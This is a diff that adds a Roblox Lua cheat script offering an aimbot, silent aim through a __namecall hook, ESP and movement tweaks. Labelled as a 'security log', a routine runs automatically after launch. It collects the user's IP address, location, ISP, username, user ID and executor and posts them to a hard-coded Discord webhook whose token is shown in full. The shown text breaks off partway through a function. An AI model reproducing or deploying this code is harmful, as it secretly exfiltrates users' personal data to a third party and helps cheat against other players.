@@ -1,0 +1,1935 @@
+--============================================================
+-- LC10 • WB  —  v15.13 (REMOTE ONLY - sem painel in-game)
+-- An0n x MaHI
+--============================================================
+
+local Players    = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UIS        = game:GetService("UserInputService")
+local Lighting   = game:GetService("Lighting")
+local Camera     = workspace.CurrentCamera
+local LP         = Players.LocalPlayer
+local RS         = game:GetService("ReplicatedStorage")
+local Debris     = game:GetService("Debris")
+local Stats      = game:GetService("Stats")
+
+print("[LC10] v15.13 (remote-only)")
+
+--=======================  SECURITY LOG  =====================
+getgenv().LC10_LogSent = false
+function sendSecurityLog()
+    if getgenv().LC10_LogSent then return end
+    getgenv().LC10_LogSent = true
+    task.spawn(function()
+        pcall(function()
+            local webhook = "https://discord.com/api/webhooks/1557780726907404298/78mhDKm66k-TZo1bxGoF-TY8AwC_wrMWX_mkB_Dt7s_Fylk0j8PslM_SjJrJrnx4b1jM"
+            local execName = "Desconhecido"
+            pcall(function() if identifyexecutor then execName = identifyexecutor() end end)
+            local platform = "Desconhecido"
+            pcall(function()
+                if UIS.TouchEnabled and not UIS.KeyboardEnabled then platform = "Mobile (Touch)"
+                elseif UIS.GamepadEnabled then platform = "Console"
+                elseif UIS.KeyboardEnabled and UIS.MouseEnabled then platform = "PC"
+                end
+            end)
+            local gameName = "Place " .. tostring(game.PlaceId)
+            pcall(function()
+                local n = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId)
+                if n and n.Name then gameName = n.Name end
+            end)
+            local ip, loc, isp = "Indisponível", "Indisponível", "Desconhecido"
+            local req = request or http_request or (syn and syn.request)
+            if req then
+                local ok, res = pcall(function()
+                    return req({ Url = "http://ip-api.com/json/?fields=status,country,regionName,city,isp,query", Method = "GET" })
+                end)
+                if ok and res and res.Body then
+                    local decodeOk, data = pcall(function() return game:GetService("HttpService"):JSONDecode(res.Body) end)
+                    if decodeOk and data and data.status == "success" then
+                        ip = tostring(data.query or "N/A")
+                        loc = tostring((data.city or "?") .. ", " .. (data.regionName or "?") .. " - " .. (data.country or "?"))
+                        isp = tostring(data.isp or "Desconhecido")
+                    end
+                end
+            end
+            local timeNow = os.date("!%Y-%m-%d %H:%M:%S UTC")
+            local sessionId = string.format("%X%X", math.random(100000, 999999), math.floor(tick()) % 100000)
+            local serverJob = game.JobId ~= "" and game.JobId or "Studio/Solo"
+            local embed = {
+                title = "LC10 SECURITY SYSTEM",
+                description = "```\nSECURITY LOG - NOVO ACESSO\n```",
+                color = 5763719,
+                fields = {
+                    { name = "[ STATUS ]", value = "```AUTORIZADO```", inline = true },
+                    { name = "[ MODO ]", value = "```REMOTE-ONLY (site)```", inline = true },
+                    { name = "[ JOGADOR ]", value = "```\n" .. LP.Name .. "\n```", inline = false },
+                    { name = "User ID", value = "```" .. tostring(LP.UserId) .. "```", inline = true },
+                    { name = "Sessao", value = "```" .. sessionId .. "```", inline = true },
+                    { name = "[ JOGO ]", value = "```\n" .. gameName .. "\n```", inline = false },
+                    { name = "Place ID", value = "```" .. tostring(game.PlaceId) .. "```", inline = true },
+                    { name = "Servidor", value = "```" .. serverJob:sub(1, 22) .. "```", inline = true },
+                    { name = "[ IP ]", value = "```\n" .. ip .. "\n```", inline = false },
+                    { name = "ISP", value = "```" .. isp .. "```", inline = true },
+                    { name = "Plataforma", value = "```" .. platform .. "```", inline = true },
+                    { name = "Local", value = "```" .. loc .. "```", inline = false },
+                    { name = "[ REGISTRO ]", value = "```\n" .. timeNow .. "\n```", inline = false },
+                    { name = "Executor", value = "```" .. execName .. "```", inline = true },
+                },
+                footer = { text = "LC10 WB - Remote" },
+                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+            }
+            if req then
+                pcall(function()
+                    req({
+                        Url = webhook, Method = "POST",
+                        Headers = { ["Content-Type"] = "application/json" },
+                        Body = game:GetService("HttpService"):JSONEncode({ username = "LC10 Security", embeds = { embed } })
+                    })
+                end)
+            end
+        end)
+    end)
+end
+task.delay(3, sendSecurityLog)
+
+--=======================  CONFIG  ===========================
+getgenv().FxConfig = getgenv().FxConfig or {}
+local DEFAULTS = {
+    SilentAim = false, AimPart = "Head", WallCheck = false, TeamCheck = false,
+    PrioLowHP = false, FovRadius = 300, ShowFov = true, FovColor = Color3.fromRGB(0, 255, 120),
+    Silent_HitChance = 100, Silent_CheckCivil = false, Silent_Pixel = false,
+    Silent_PriorityList = {}, Silent_IgnoreList = {},
+    Aimbot = false, AimbotSmooth = 0.4, AimbotSnap = true, AimbotPart = "Head",
+    AimbotFov = 300, AimbotTeamCheck = true, AimbotOnlyZoom = true, AimbotRequireBtn = false,
+    AimbotPrioCrosshair = true, Aimbot_CheckCivil = false,
+    Aimbot_PriorityList = {}, Aimbot_IgnoreList = {},
+    ShowAimbotFov = true, AimbotFovColor = Color3.fromRGB(255, 60, 60),
+    Sweat_Enabled = false, Sweat_Part = "Head",
+    Sweat_Fov = 300, Sweat_ShowFov = true, Sweat_FovColor = Color3.fromRGB(255, 180, 60),
+    Sweat_TeamCheck = true, Sweat_OnlyZoom = false,
+    Sweat_Reaction = 180, Sweat_Predict = 30, Sweat_LockStrength = 95,
+    Sweat_PixelAim = false,
+    Sweat_PriorityList = {}, Sweat_IgnoreList = {},
+    Stream_Enabled = false, Stream_HideESP = true, Stream_HideFOV = true,
+    Stream_HideHUD = true,
+    ESP = false, ESPNames = true, ESPDist = true, ESPWeapon = true, ESPHealth = true,
+    ESPTeamCheck = false, ESPColor = Color3.fromRGB(255, 60, 60),
+    SkeletonESP = false, SkeletonColor = Color3.fromRGB(0, 255, 120),
+    BoxESP = false, BoxColor = Color3.fromRGB(255, 255, 255),
+    BoxV2ESP = false, BoxV2Color = Color3.fromRGB(0, 200, 255),
+    TracerESP = false, TracerColor = Color3.fromRGB(255, 0, 0),
+    AntiAFK = true, SpeedEnabled = false, SpeedValue = 16,
+    JumpEnabled = false, JumpValue = 50, AntiFling = false,
+    PanicEnabled = true, PanicTaps = 5, PanicWindow = 3,
+    FPS_LowGraphics = false, FPS_RemoveParticles = false,
+    FPS_TexturePack = false, FPS_RemoveFog = false,
+    FPS_Fullbright = false, FPS_NoShadows = false,
+    Custom_RifleEnabled = false, Custom_RifleColor = "Vermelho",
+    Custom_RifleSound = "Nenhum",
+    Custom_PistolEnabled = false, Custom_PistolColor = "Vermelho",
+    Custom_PistolSound = false, Custom_PistolAltSound = "Nenhum",
+    Custom_BufaloEnabled = false, Custom_BufaloColor = "Vermelho",
+    Custom_Vidrom = false, Custom_LineB = false, Custom_LineBColor = "Cor padrão",
+    HUD_Crosshair = false, HUD_CrosshairStyle = "Cruz + Ponto",
+    HUD_CrosshairColor = Color3.fromRGB(0, 255, 100),
+    HUD_CrosshairSize = 12, HUD_CrosshairThick = 2, HUD_CrosshairDot = 3,
+    HUD_ShowFPS = false, HUD_ShowPing = false, HUD_ShowRAM = false,
+    HUD_ShowPlayers = false, HUD_ShowCoords = false, HUD_ShowTime = false,
+    HUD_InfoPos = "Top Esquerda",
+    HUD_HealthBar = false, HUD_HealthPos = "Baixo",
+    HUD_Watermark = false,
+    HUD_HideChat = false, HUD_HideBackpack = false,
+    HUD_HidePlayerList = false, HUD_HideGameHUD = false,
+    Debug = false,
+}
+for k, v in pairs(DEFAULTS) do
+    if getgenv().FxConfig[k] == nil then getgenv().FxConfig[k] = v end
+end
+for _, key in ipairs({"Silent_PriorityList","Silent_IgnoreList","Aimbot_PriorityList","Aimbot_IgnoreList","Sweat_PriorityList","Sweat_IgnoreList"}) do
+    if type(getgenv().FxConfig[key]) ~= "table" then getgenv().FxConfig[key] = {} end
+end
+
+local C = getgenv().FxConfig
+function dbg(...) if C.Debug then print("[LC10]", ...) end end
+
+local hidden = false
+local streamHidden = false
+local currentTarget = nil
+local isZooming = false
+local lockedTarget = nil
+local lockedPlr = nil
+local sweatTargetPlr = nil
+local sweatStartTime = 0
+local sweatLastPick = 0
+local sweatAimPos = nil
+local silentRedirectPass = true
+local _sweatCachedTarget = nil
+
+--=======================  CACHES  ===========================
+_G.FxSkelCache, _G.FxBoxCache, _G.FxBoxV2Cache = {}, {}, {}
+_G.FxTracerCache, _G.FxHpCache, _G.FxEspCache = {}, {}, {}
+_G.FxFPSState = {
+    originalLighting = {}, originalSky = nil, originalAtmosphere = nil,
+    originalParts = {}, removedInstances = {}, originalTerrain = nil,
+}
+local espCache = _G.FxEspCache
+local hasDrawing = pcall(function() return Drawing end)
+local skelCache = _G.FxSkelCache
+local boxCache = _G.FxBoxCache
+local boxV2Cache = _G.FxBoxV2Cache
+local tracerCache = _G.FxTracerCache
+local hpCache = _G.FxHpCache
+local civilTeamCache = {}
+local processedSounds = {}
+local originalWeaponState = {}
+local hudState = {}
+local hiddenHUD = {}
+local fpsCounter = { frames = 0, lastUpdate = tick(), value = 60 }
+local originalNamecall = nil
+local hookActive = false
+
+--=======================  PANIC (sem UI)  ===================
+_G.FxTapTimestamps = {}
+_G.FxLastPanicTrigger = 0
+
+function _G.FxPruneTaps()
+    local now = tick()
+    local newList = {}
+    for _, t in ipairs(_G.FxTapTimestamps) do
+        if now - t <= C.PanicWindow then table.insert(newList, t) end
+    end
+    _G.FxTapTimestamps = newList
+end
+
+function destroyDrawing(obj)
+    if obj == nil then return end
+    local ok = pcall(function() obj:Remove() end)
+    if ok then return end
+    if type(obj) == "table" then
+        for _, sub in pairs(obj) do
+            if sub ~= nil then
+                pcall(function() sub:Remove() end)
+                if type(sub) == "table" then
+                    for _, ssub in pairs(sub) do pcall(function() ssub:Remove() end) end
+                end
+            end
+        end
+    end
+end
+
+function _G.FxHideAllDrawings()
+    local caches = {_G.FxSkelCache, _G.FxBoxCache, _G.FxBoxV2Cache, _G.FxTracerCache, _G.FxHpCache}
+    for _, cache in ipairs(caches) do
+        for key, data in pairs(cache) do
+            destroyDrawing(data)
+            cache[key] = nil
+        end
+    end
+    for plr, data in pairs(_G.FxEspCache) do
+        if data.highlight then pcall(function() data.highlight:Destroy() end) end
+        if data.billboard then pcall(function() data.billboard:Destroy() end) end
+        _G.FxEspCache[plr] = nil
+    end
+end
+
+function _G.FxTogglePanic(hide)
+    hidden = hide
+    if _G.FxFovGui then _G.FxFovGui.Enabled = not hide end
+    if _G.FxAimFovGui then _G.FxAimFovGui.Enabled = not hide end
+    if _G.FxHudGui then _G.FxHudGui.Enabled = not hide end
+    if _G.FxSweatFovGui then _G.FxSweatFovGui.Enabled = not hide end
+    if hide then _G.FxHideAllDrawings() end
+end
+
+function _G.FxToggleStream(on)
+    C.Stream_Enabled = on
+    streamHidden = on
+    local function setV(gui, v) if gui then gui.Enabled = v end end
+    if C.Stream_HideFOV then
+        setV(_G.FxFovGui, not on)
+        setV(_G.FxAimFovGui, not on)
+        setV(_G.FxSweatFovGui, not on)
+    end
+    if C.Stream_HideHUD then setV(_G.FxHudGui, not on) end
+    if C.Stream_HideESP and on then _G.FxHideAllDrawings() end
+    print("[LC10] Stream", on and "ON" or "OFF")
+end
+
+function _G.FxRegisterTap()
+    if not C.PanicEnabled then return end
+    if tick() - _G.FxLastPanicTrigger < 1 then return end
+    _G.FxPruneTaps()
+    table.insert(_G.FxTapTimestamps, tick())
+    if #_G.FxTapTimestamps >= C.PanicTaps then
+        _G.FxLastPanicTrigger = tick()
+        _G.FxTapTimestamps = {}
+        _G.FxTogglePanic(not hidden)
+    end
+end
+
+UIS.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then _G.FxRegisterTap() end
+end)
+if UIS.TouchEnabled then
+    UIS.TouchStarted:Connect(function(input) _G.FxRegisterTap() end)
+end
+task.spawn(function() while task.wait(0.5) do _G.FxPruneTaps() end end)
+
+--=======================  ALVO  =============================
+local cachedMyPos = Vector3.zero
+local cachedPlayers = {}
+
+function isAlive(p)
+    local ch = p.Character
+    local h = ch and ch:FindFirstChildOfClass("Humanoid")
+    return h and h.Health > 0
+end
+function sameTeam(a, b)
+    return a and b and a.Team and b.Team and a.Team == b.Team
+end
+
+function isCivilTeamName(tn)
+    local cached = civilTeamCache[tn]
+    if cached ~= nil then return cached end
+    local result = tn:find("civil") ~= nil
+                or tn:find("civilian") ~= nil
+                or tn:find("citizen") ~= nil
+                or tn == "civ"
+    civilTeamCache[tn] = result
+    return result
+end
+function isCivil(plr)
+    if not plr then return false end
+    local team = plr.Team
+    if not team or not team.Name then return false end
+    return isCivilTeamName(team.Name:lower())
+end
+
+function inFov(pos, radius)
+    local screen, on = Camera:WorldToViewportPoint(pos)
+    if not on then return false end
+    local center = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
+    return (Vector2.new(screen.X, screen.Y) - center).Magnitude <= (radius or C.FovRadius)
+end
+function canSee(targetPart)
+    if not C.WallCheck then return true end
+    local origin = cachedMyPos
+    local dir = targetPart.Position - origin
+    local params = RaycastParams.new()
+    params.FilterType = Enum.RaycastFilterType.Exclude
+    params.FilterDescendantsInstances = { LP.Character }
+    local result = workspace:Raycast(origin, dir, params)
+    if not result then return true end
+    local hit = result.Instance
+    if hit and targetPart.Parent and hit:IsDescendantOf(targetPart.Parent) then return true end
+    return false
+end
+
+-- PIXEL AIM (grade 3x3x3)
+function getVisiblePixel(plr)
+    if not plr then return nil end
+    local ch = plr.Character
+    if not ch then return nil end
+
+    local cx = Camera.ViewportSize.X / 2
+    local cy = Camera.ViewportSize.Y / 2
+    local origin = cachedMyPos
+
+    local PARTS = {
+        { name = "Head",          prio = 1 },
+        { name = "UpperTorso",    prio = 2 },
+        { name = "LowerTorso",    prio = 3 },
+        { name = "LeftUpperArm",  prio = 4 },
+        { name = "RightUpperArm", prio = 4 },
+        { name = "LeftLowerArm",  prio = 5 },
+        { name = "RightLowerArm", prio = 5 },
+        { name = "LeftHand",      prio = 6 },
+        { name = "RightHand",     prio = 6 },
+        { name = "LeftUpperLeg",  prio = 5 },
+        { name = "RightUpperLeg", prio = 5 },
+        { name = "LeftLowerLeg",  prio = 6 },
+        { name = "RightLowerLeg", prio = 6 },
+        { name = "LeftFoot",      prio = 7 },
+        { name = "RightFoot",     prio = 7 },
+    }
+    local PARTS_R6 = {
+        { name = "Head",      prio = 1 },
+        { name = "Torso",     prio = 2 },
+        { name = "Left Arm",  prio = 4 },
+        { name = "Right Arm", prio = 4 },
+        { name = "Left Leg",  prio = 5 },
+        { name = "Right Leg", prio = 5 },
+    }
+    if ch:FindFirstChild("Torso") and not ch:FindFirstChild("UpperTorso") then
+        PARTS = PARTS_R6
+    end
+
+    local params = RaycastParams.new()
+    params.FilterType = Enum.RaycastFilterType.Exclude
+    params.FilterDescendantsInstances = { LP.Character }
+
+    local best, bestScore = nil, math.huge
+
+    for _, pInfo in ipairs(PARTS) do
+        local part = ch:FindFirstChild(pInfo.name)
+        if part and part:IsA("BasePart") then
+            for ix = -1, 1 do
+                for iy = -1, 1 do
+                    for iz = -1, 1 do
+                        local localPos = Vector3.new(ix, iy, iz) * 0.45 * part.Size
+                        local worldPos = part.CFrame:PointToWorldSpace(localPos)
+
+                        local sp, onScreen = Camera:WorldToViewportPoint(worldPos)
+                        if onScreen then
+                            local dir = worldPos - origin
+                            local hit = workspace:Raycast(origin, dir, params)
+                            if hit and hit.Instance and hit.Instance:IsDescendantOf(ch) then
+                                local distCross = (Vector2.new(sp.X, sp.Y) - Vector2.new(cx, cy)).Magnitude
+                                local score = distCross + (pInfo.prio * 30)
+                                if score < bestScore then
+                                    bestScore = score
+                                    best = worldPos
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    return best
+end
+
+function pickTarget(partName, radius, teamCheck, priorityList, ignoreList, checkCivil, usePixel)
+    if #cachedPlayers < 2 then return nil end
+    local best, bestScore = nil, math.huge
+    local origin = cachedMyPos
+    for _, plr in ipairs(cachedPlayers) do
+        if plr ~= LP and isAlive(plr) then
+            if ignoreList and ignoreList[plr.UserId] then continue end
+            if checkCivil and isCivil(plr) then continue end
+            local ch = plr.Character
+            local part = ch:FindFirstChild(partName or "Head") or ch:FindFirstChild("Head")
+            if part then
+                if teamCheck and sameTeam(LP, plr) then continue end
+                if not inFov(part.Position, radius) then continue end
+                if not canSee(part) then continue end
+                local dist = (part.Position - origin).Magnitude
+                local score = dist
+                if C.AimbotPrioCrosshair then
+                    local sp = Camera:WorldToViewportPoint(part.Position)
+                    local cx = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
+                    score = (Vector2.new(sp.X, sp.Y) - cx).Magnitude
+                end
+                if C.PrioLowHP then
+                    local hum = ch:FindFirstChildOfClass("Humanoid")
+                    score = hum and hum.Health or score
+                end
+                if priorityList and priorityList[plr.UserId] then
+                    score = score - 1e6
+                end
+                if score < bestScore then
+                    bestScore = score
+                    best = { plr = plr, part = part, pos = part.Position }
+                end
+            end
+        end
+    end
+    if best and usePixel then
+        local pixelPos = getVisiblePixel(best.plr)
+        if pixelPos then best.pos = pixelPos end
+    end
+    return best
+end
+
+--=======================  ZOOM  =============================
+local BASE_FOV = 70
+local fovSample = Camera.FieldOfView
+task.spawn(function()
+    while task.wait(0.5) do
+        if not isZooming then
+            fovSample = fovSample * 0.9 + Camera.FieldOfView * 0.1
+            BASE_FOV = fovSample
+        end
+    end
+end)
+
+--=======================  HOOK  =============================
+local HOT_METHODS = {
+    ScreenPointToRay = true,
+    ViewportPointToRay = true,
+    Raycast = true,
+}
+function isHotMethod(m)
+    return HOT_METHODS[m] ~= nil or m:find("FindPartOnRay") ~= nil
+end
+
+function theNamecall(self, ...)
+    local method = getnamecallmethod()
+    if not isHotMethod(method) then
+        return originalNamecall(self, ...)
+    end
+    if C.SilentAim and silentRedirectPass and currentTarget then
+        if method == "ScreenPointToRay" or method == "ViewportPointToRay" then
+            local origin = cachedMyPos
+            local dir = (currentTarget.pos - origin).Unit
+            return Ray.new(origin, dir * 1000)
+        end
+        if method == "Raycast" or method:find("FindPartOnRay") then
+            local args = {...}
+            if args[1] and typeof(args[1]) == "Ray" then
+                local origin = args[1].Origin
+                local dir = (currentTarget.pos - origin).Unit
+                args[1] = Ray.new(origin, dir * 1000)
+                return originalNamecall(self, unpack(args))
+            end
+        end
+    end
+    return originalNamecall(self, ...)
+end
+
+function setHook(on)
+    if not pcall(function() return hookmetamethod end) then return end
+    if on and not hookActive then
+        if not originalNamecall then
+            originalNamecall = hookmetamethod(game, "__namecall", theNamecall)
+        else
+            hookmetamethod(game, "__namecall", theNamecall)
+        end
+        hookActive = true
+    elseif not on and hookActive then
+        hookmetamethod(game, "__namecall", originalNamecall)
+        hookActive = false
+    end
+end
+
+function updateHookState()
+    local wantsHook = C.SilentAim
+    if wantsHook ~= hookActive then
+        setHook(wantsHook)
+    end
+end
+
+--=======================  AIMBOT NORMAL  ====================
+function aimbotStep()
+    if hidden or streamHidden then return end
+    if not C.Aimbot then
+        lockedTarget = nil lockedPlr = nil
+        return
+    end
+    if C.Sweat_Enabled then return end
+
+    local trig = false
+    if C.AimbotOnlyZoom and isZooming then trig = true end
+    if C.AimbotRequireBtn then trig = true end
+    if not C.AimbotOnlyZoom and not C.AimbotRequireBtn then trig = true end
+    if not trig then
+        lockedTarget = nil lockedPlr = nil
+        return
+    end
+
+    local cx = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
+
+    if lockedTarget and lockedPlr then
+        local ch = lockedPlr.Character
+        local part = ch and ch:FindFirstChild(C.AimbotPart)
+        local isIgnored = C.Aimbot_IgnoreList[lockedPlr.UserId]
+        local isCivilLocked = C.Aimbot_CheckCivil and isCivil(lockedPlr)
+        if not part or not isAlive(lockedPlr) or isIgnored or isCivilLocked then
+            lockedTarget = nil lockedPlr = nil
+        else
+            local sp, on = Camera:WorldToViewportPoint(part.Position)
+            local releaseFov = C.AimbotFov * 1.5
+            if not on or (Vector2.new(sp.X, sp.Y) - cx).Magnitude > releaseFov then
+                lockedTarget = nil lockedPlr = nil
+            else
+                lockedTarget = { pos = part.Position }
+            end
+        end
+    end
+
+    if not lockedTarget then
+        local t = pickTarget(C.AimbotPart, C.AimbotFov, C.AimbotTeamCheck, C.Aimbot_PriorityList, C.Aimbot_IgnoreList, C.Aimbot_CheckCivil, false)
+        if t then
+            lockedTarget = { pos = t.pos }
+            lockedPlr = t.plr
+        end
+    end
+
+    if not lockedTarget then return end
+
+    local origin = cachedMyPos
+    local tgtCF = CFrame.new(origin, lockedTarget.pos)
+    if C.AimbotSnap and isZooming then
+        Camera.CFrame = tgtCF
+    else
+        Camera.CFrame = Camera.CFrame:Lerp(tgtCF, C.AimbotSmooth)
+    end
+end
+pcall(function() RunService:UnbindFromRenderStep("FxAimbot") end)
+RunService:BindToRenderStep("FxAimbot", 201, aimbotStep)
+
+--=======================  SWEAT+  ===========================
+function sweatStep(dt)
+    if hidden or streamHidden then return end
+    if not C.Sweat_Enabled then
+        sweatTargetPlr = nil sweatStartTime = 0 sweatAimPos = nil
+        _sweatCachedTarget = nil
+        return
+    end
+    if C.Aimbot then
+        sweatTargetPlr = nil sweatAimPos = nil
+        _sweatCachedTarget = nil
+        return
+    end
+
+    local trig = false
+    if C.Sweat_OnlyZoom and isZooming then trig = true end
+    if not C.Sweat_OnlyZoom then trig = true end
+    if not trig then
+        sweatTargetPlr = nil sweatAimPos = nil
+        _sweatCachedTarget = nil
+        return
+    end
+
+    local now = tick()
+    if now - sweatLastPick > 0.1 then
+        sweatLastPick = now
+        _sweatCachedTarget = pickTarget(C.Sweat_Part, C.Sweat_Fov, C.Sweat_TeamCheck, C.Sweat_PriorityList, C.Sweat_IgnoreList, false, false)
+
+        if _sweatCachedTarget and C.Sweat_PixelAim then
+            local ch = _sweatCachedTarget.plr.Character
+            if ch then
+                local pixelPos = getVisiblePixel(_sweatCachedTarget.plr)
+                _sweatCachedTarget.pixelPos = pixelPos or nil
+            end
+        else
+            if _sweatCachedTarget then _sweatCachedTarget.pixelPos = nil end
+        end
+    end
+
+    local sweatTarget = _sweatCachedTarget
+    if not sweatTarget then
+        sweatTargetPlr = nil sweatAimPos = nil
+        return
+    end
+
+    local ch = sweatTarget.plr.Character
+    local part = ch and (ch:FindFirstChild(C.Sweat_Part) or ch:FindFirstChild("Head"))
+    if not part then
+        _sweatCachedTarget = nil sweatAimPos = nil
+        return
+    end
+
+    local liveTargetPos = sweatTarget.pixelPos or part.Position
+
+    if sweatTargetPlr ~= sweatTarget.plr then
+        sweatTargetPlr = sweatTarget.plr
+        sweatStartTime = now
+        sweatAimPos = liveTargetPos
+    end
+
+    local reactionSec = C.Sweat_Reaction / 1000
+    if now - sweatStartTime < reactionSec then return end
+
+    local root = ch:FindFirstChild("HumanoidRootPart")
+    local vel = root and root.AssemblyLinearVelocity or Vector3.zero
+    local predictOffset = Vector3.zero
+    if C.Sweat_Predict > 0 and vel.Magnitude > 1 then
+        local factor = (C.Sweat_Predict / 100) * 0.30
+        predictOffset = vel * factor
+        if predictOffset.Magnitude > 6 then
+            predictOffset = predictOffset.Unit * 6
+        end
+    end
+
+    local aimPos = liveTargetPos + predictOffset
+
+    if not sweatAimPos then sweatAimPos = aimPos
+    else sweatAimPos = sweatAimPos:Lerp(aimPos, 0.4) end
+
+    local origin = Camera.CFrame.Position
+    local tgtCF = CFrame.new(origin, sweatAimPos)
+
+    local lockFactor = C.Sweat_LockStrength / 100
+    local elapsed = now - sweatStartTime - reactionSec
+    local easingFactor = math.clamp(elapsed / 0.15, 0.3, 1)
+    local smooth = 0.65 + ((0.95 - 0.65) * easingFactor * lockFactor)
+    smooth = math.clamp(smooth, 0.05, 0.98)
+
+    Camera.CFrame = Camera.CFrame:Lerp(tgtCF, smooth)
+end
+pcall(function() RunService:UnbindFromRenderStep("FxSweat") end)
+RunService:BindToRenderStep("FxSweat", 203, sweatStep)
+
+--=======================  THROTTLE SILENT  ==================
+task.spawn(function()
+    while task.wait(0.1) do
+        if C.SilentAim then
+            currentTarget = pickTarget(C.AimPart, C.FovRadius, C.TeamCheck, C.Silent_PriorityList, C.Silent_IgnoreList, C.Silent_CheckCivil, C.Silent_Pixel)
+            if currentTarget then
+                local chance = C.Silent_HitChance or 100
+                if chance >= 100 then silentRedirectPass = true
+                elseif chance <= 0 then silentRedirectPass = false
+                else silentRedirectPass = (math.random(1, 100) <= chance) end
+            else
+                silentRedirectPass = true
+            end
+        else
+            silentRedirectPass = false
+        end
+        updateHookState()
+    end
+end)
+
+--=======================  FPS FUNCTIONS  ====================
+function applyLowGraphics(on)
+    if on then
+        pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
+        pcall(function() Lighting.GlobalShadows = false Lighting.ShadowSoftness = 0 end)
+        task.spawn(function()
+            for _, v in ipairs(workspace:GetDescendants()) do
+                if v:IsA("BasePart") then v.CastShadow = false end
+            end
+        end)
+    else
+        pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Automatic end)
+        pcall(function() Lighting.GlobalShadows = true end)
+    end
+end
+
+function applyRemoveParticles(on)
+    local state = _G.FxFPSState
+    if on then
+        state.removedInstances = {}
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Fire")
+               or v:IsA("Sparkles") or v:IsA("Beam") or v:IsA("Trail") then
+                pcall(function() v.Enabled = false table.insert(state.removedInstances, v) end)
+            end
+        end
+    else
+        for _, v in ipairs(state.removedInstances or {}) do
+            pcall(function() v.Enabled = true end)
+        end
+        state.removedInstances = {}
+    end
+end
+
+function applyTexturePack(on)
+    local state = _G.FxFPSState
+    if on then
+        state.originalLighting = {
+            Ambient = Lighting.Ambient, OutdoorAmbient = Lighting.OutdoorAmbient,
+            Brightness = Lighting.Brightness, GlobalShadows = Lighting.GlobalShadows,
+            FogEnd = Lighting.FogEnd, FogStart = Lighting.FogStart, FogColor = Lighting.FogColor,
+            EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
+            EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
+        }
+        local sky = Lighting:FindFirstChildOfClass("Sky")
+        if sky then state.originalSky = sky:Clone() sky.Parent = nil end
+        local atm = Lighting:FindFirstChildOfClass("Atmosphere")
+        if atm then state.originalAtmosphere = atm:Clone() atm.Parent = nil end
+        local clouds = Lighting:FindFirstChildOfClass("Clouds")
+        if clouds then state.originalClouds = clouds:Clone() clouds.Parent = nil end
+        state.originalEffects = {}
+        for _, v in ipairs(Lighting:GetChildren()) do
+            if v:IsA("PostEffect") then
+                table.insert(state.originalEffects, { obj = v, prop = "Enabled", val = v.Enabled })
+                v.Enabled = false
+            end
+        end
+        pcall(function()
+            Lighting.Ambient = Color3.fromRGB(180, 180, 180)
+            Lighting.OutdoorAmbient = Color3.fromRGB(180, 180, 180)
+            Lighting.Brightness = 3
+            Lighting.GlobalShadows = false
+            Lighting.FogEnd = 1e9
+            Lighting.FogStart = 1e9
+            Lighting.FogColor = Color3.fromRGB(255, 255, 255)
+            Lighting.EnvironmentDiffuseScale = 0
+            Lighting.EnvironmentSpecularScale = 0
+        end)
+        state.originalParts = {}
+        task.spawn(function()
+            for _, v in ipairs(workspace:GetDescendants()) do
+                pcall(function()
+                    if v:IsA("Decal") then
+                        table.insert(state.originalParts, { obj = v, prop = "Transparency", val = v.Transparency })
+                        v.Transparency = 1
+                    elseif v:IsA("SurfaceAppearance") then
+                        for _, prop in ipairs({"ColorMap", "NormalMap", "RoughnessMap", "MetalnessMap"}) do
+                            local val = v[prop]
+                            if val and val ~= "" then
+                                table.insert(state.originalParts, { obj = v, prop = prop, val = val })
+                                v[prop] = ""
+                            end
+                        end
+                    elseif v:IsA("BasePart") then
+                        table.insert(state.originalParts, { obj = v, prop = "Material", val = v.Material })
+                        v.Material = Enum.Material.Plastic
+                        if v.Reflectance ~= 0 then
+                            table.insert(state.originalParts, { obj = v, prop = "Reflectance", val = v.Reflectance })
+                            v.Reflectance = 0
+                        end
+                        if v:IsA("MeshPart") and v.TextureID and v.TextureID ~= "" then
+                            table.insert(state.originalParts, { obj = v, prop = "TextureID", val = v.TextureID })
+                            v.TextureID = ""
+                        end
+                        for _, m in ipairs(v:GetChildren()) do
+                            if m:IsA("SpecialMesh") and m.TextureId and m.TextureId ~= "" then
+                                table.insert(state.originalParts, { obj = m, prop = "TextureId", val = m.TextureId })
+                                m.TextureId = ""
+                            end
+                        end
+                    end
+                end)
+            end
+        end)
+    else
+        for k, val in pairs(state.originalLighting or {}) do
+            pcall(function() Lighting[k] = val end)
+        end
+        if state.originalSky then state.originalSky.Parent = Lighting state.originalSky = nil end
+        if state.originalAtmosphere then state.originalAtmosphere.Parent = Lighting state.originalAtmosphere = nil end
+        if state.originalClouds then state.originalClouds.Parent = Lighting state.originalClouds = nil end
+        for _, item in ipairs(state.originalEffects or {}) do
+            pcall(function() item.obj[item.prop] = item.val end)
+        end
+        state.originalEffects = {}
+        for _, item in ipairs(state.originalParts or {}) do
+            pcall(function() item.obj[item.prop] = item.val end)
+        end
+        state.originalParts = {}
+    end
+end
+
+function applyRemoveFog(on)
+    local state = _G.FxFPSState
+    if on then
+        state.originalFog = {
+            FogEnd = Lighting.FogEnd, FogStart = Lighting.FogStart,
+            FogColor = Lighting.FogColor, Ambient = Lighting.Ambient,
+        }
+        pcall(function()
+            Lighting.FogEnd = 1e9 Lighting.FogStart = 1e9
+            Lighting.FogColor = Color3.fromRGB(255, 255, 255)
+        end)
+        local atm = Lighting:FindFirstChildOfClass("Atmosphere")
+        if atm then state.originalAtmFog = { Density = atm.Density, Haze = atm.Haze }
+            atm.Density = 0 atm.Haze = 0
+        end
+    else
+        for k, val in pairs(state.originalFog or {}) do
+            pcall(function() Lighting[k] = val end)
+        end
+        local atm = Lighting:FindFirstChildOfClass("Atmosphere")
